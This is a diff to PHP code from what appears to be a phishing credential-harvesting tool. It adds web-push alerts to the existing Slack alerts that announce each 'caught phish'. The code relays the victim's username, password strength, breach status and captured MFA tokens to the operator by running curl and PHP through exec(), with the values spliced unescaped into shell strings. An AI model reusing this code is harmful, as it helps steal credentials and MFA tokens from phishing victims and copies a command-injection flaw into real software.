@@ -462,10 +462,16 @@ exec($cmdtrophy5);
 // If the Password is Set, Change Slack Message
 $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;
 
+if($passstrength == ":poop:"){$pushstrength = "💩";}else{$pushstrength = "👌";}
+
+$messagepush = "Caught Another Phish at ".$portal."!\r\nPassword Strength is ".$pushstrength;
+
 } else {
 
 // If the Password is Not Set, Do Not Include Password Strength in Slack Message
 $message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";
+
+$messagepush = "Caught Another Phish at ".$portal."!";
 
 }
 
@@ -473,12 +479,20 @@ if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".numb
 
 if($MFAToken != ""){
 $message = $message."\r\n> MFA Provided as `".$MFAToken."`";	
+$messagepush = $message."\r\nMFA Provided as ".$MFAToken."";
 }
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
 
 exec($cmd);
+
+//$message = "Caught Another Phish at ".$portal."!\r\nOther";
+
+// Execute Web Push Notifications
+$cmdpush = 'cd config && php push.php "'.$messagepush.'" "PhishBot" "./phishicon.png" "'.$slacklink.'" "PhishBot"';
+
+exec($cmdpush);
 
 }
 
